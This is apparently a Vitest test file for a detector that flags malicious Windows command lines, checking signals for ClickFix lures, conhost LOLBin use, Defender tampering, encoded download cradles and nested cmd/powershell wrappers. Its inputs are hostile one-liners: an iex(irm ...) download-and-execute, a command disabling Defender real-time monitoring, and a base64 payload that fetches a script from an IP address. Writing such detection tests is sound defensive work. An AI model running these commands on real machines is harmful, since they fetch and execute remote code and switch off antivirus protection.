import { describe, expect, it } from 'vitest'
import { analyze } from '../report'

describe('analyze() sees the launcher/wrapper prefix (not just the -Command body)', () => {
  it('conhost --headless powershell -c <cradle> fires clickfix + the conhost LOLBin', async () => {
    const r = await analyze('conhost --headless powershell -nop -c iex(irm http://x.test/a)')
    const ids = r.signals.map((s) => s.id)
    expect(ids).toContain('clickfix')
    expect(ids).toContain('lolbin')
  })

  it('a launcher prefix with a LOCAL (non-download) payload still yields signals', async () => {
    const r = await analyze('conhost --headless powershell -w hidden -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true"')
    const ids = r.signals.map((s) => s.id)
    expect(ids).toContain('lolbin')          // conhost
    expect(ids).toContain('defender-tamper')
  })

  it('an -enc one-liner still decodes AND its inner payload signals fire through analyze()', async () => {
    // -enc payload decodes to: IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')
    const enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
    const r = await analyze('powershell -nop -w hidden -enc ' + enc)
    expect(r.signals.map((s) => s.id)).toContain('download-cradle')
  })
})

describe('nested interpreter re-entry (§2.1)', () => {
  it('cmd /c powershell -w hidden -enc <b64> decodes the inner blob and matches the top-level PS result', async () => {
    const enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
    const wrapped = await analyze('cmd /c powershell -w hidden -enc ' + enc)
    const topLevel = await analyze('powershell -w hidden -enc ' + enc)
    expect(wrapped.signals.map((s) => s.id).sort()).toEqual(topLevel.signals.map((s) => s.id).sort())
    expect(wrapped.iocs.map((i) => i.raw).sort()).toEqual(topLevel.iocs.map((i) => i.raw).sort())
    expect(wrapped.layers.some((l) => l.transform.includes('cmd→powershell'))).toBe(true)
  })

  it('a pathological wrapper-in-wrapper terminates at the depth cap instead of spinning', async () => {
    const deep = 'cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c whoami'
    const r = await analyze(deep)
    const cmdHops = r.layers.filter((l) => l.transform.includes('cmd→cmd'))
    expect(cmdHops.length).toBe(4) // NESTED_REENTRY_MAX_DEPTH
    expect(r.layers[r.layers.length - 1].text).toContain('cmd /c') // did NOT fully unwrap — the cap stopped it
  })
})

describe('WSH numeric char-code decode (§4)', () => {
  it('a Chr()-encoded mshta payload gets a decode layer and its own signals; a PS script with literal Chr() text is untouched', async () => {
    const mshta = await analyze('mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))')
    expect(mshta.layers.some((l) => l.transform.includes('fromCharCode') || l.transform.includes('Chr'))).toBe(true)
    const ps = await analyze("Write-Host 'Chr(72)&Chr(105)'")
    expect(ps.layers.some((l) => l.transform.includes('Chr'))).toBe(false)
  })
})
